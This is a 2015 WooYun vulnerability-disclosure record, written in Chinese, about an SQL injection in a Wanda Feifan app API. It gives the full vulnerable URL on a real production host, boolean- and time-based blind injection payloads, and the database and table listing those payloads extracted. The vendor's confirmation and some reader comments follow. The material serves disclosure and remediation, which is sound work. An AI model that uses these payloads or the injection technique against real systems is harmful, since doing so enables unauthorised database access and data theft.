{"id": 71407, "wybug_id": "wooyun-2015-0146004", "wybug_title": "万达飞凡APP某处SQL注入泄露电影业务数据", "wybug_corp": "万达电商", "wybug_author": "逆流冰河", "wybug_date": "2015-10-11 17:33", "wybug_open_date": "2015-11-27 11:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-27：\t细节向公众公开  简要描述： 万达对安全非常重视,这一点值得表扬顺便说句,不要认为不重要的地方就没有漏洞,其实漏洞哪都有 详细说明：  1,本来是要找APP的漏洞的,今天不是休息嘛,结果找到了app调用后台的SQL注入,泄露了很多东西2,废话少说,注入点:http://api.ffan.com/film/v2/film/lists?cityNo=320100&imei=525af1deaf994570ae27070eb4b8b0f064d3ef4c&userId=15000000009411631&version=1&wdId=db9f5185ab0beb3c4b6ea459952918c2&FFClientVersion=21010&ddId=525af1deaf994570ae27070eb4b8b0f064d3ef4c&FFClientType=2&publishStatus=1万万没有想到是cityNo存在注入点吧Parameter: cityNo (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cityNo=320100' AND 2633=2633 AND 'XTMk'='XTMk&imei=525af1deaf9945709952918c2&FFClientVersion=21010&ddId=525af1deaf994570ae27070eb4b8b0f064d3ef4c&FF    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: cityNo=320100' AND (SELECT * FROM (SELECT(SLEEP(5)))YGiJ) AND 'xUCt&wdId=db9f5185ab0beb3c4b6ea459952918c2&FFClientVersion=21010&ddId=525af1deaf9945---available databases [3]:[*] information_schema[*] test[*] ticket3,看看有那些表,吓死宝宝了Database: ticket[44 tables]+----------------------------+| audit                      || certificate                || certificate_synchronize    || film                       || film_certificate_to_data   || film_cinema                || film_city                  || film_city_mapping          || film_company               || film_coupon                | 是优惠券吗?| film_coupon_film           || film_detail                || film_dimen                 || film_followed              || film_grade                 || film_hall                  || film_in_time               || film_lottery               || film_lottery_number        || film_lottery_prize         || film_lottery_winning       || film_mapping               || film_preferential          || film_preferential_margin   || film_preferential_store    || film_preferential_user_log || film_sale_margin           || film_sale_user_log         || film_seat                  || film_show                  || film_ticket_check          || film_type                  || marketing_plan             | 是销售计划吗| order_product              || product                    || product_oper_record        || product_package            || product_pic                || product_spec               || product_spec_temp          || product_stock              || product_store              || sms_queue                  || third_certificate          |+----------------------------+4,好吧,我就不继续了   漏洞证明：  Fix   修复方案：  加强开发人员安全意识吧   版权声明：转载请注明来源 逆流冰河@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-10-13 11:17 厂商回复： 感谢逆流冰河同学的关注与贡献！马上通知业务整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-12 16:47 |    \t\tyeweit6 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 豫章故郡，洪都新府。星分翼轸，地接衡庐。...)\t\t \n  悲伤逆流    \n     2015-10-12 17:03 |    \t\t逆流冰河 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:36        | 逆水行舟难于恒，流水年华苦于今，冰天...)\t\t \n  @yeweit6 成河    \n     2015-10-13 11:27 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:246 漏洞数:84        | The quiter you are,the more you're able ...)\t\t \n  洞主测试app注入的时候是手测还是批量测试数据包？    \n     2015-10-13 11:48 |    \t\t逆流冰河 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:36        | 逆水行舟难于恒，流水年华苦于今，冰天...)\t\t \n  @Me_Fortune 技术有限,手动测试    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}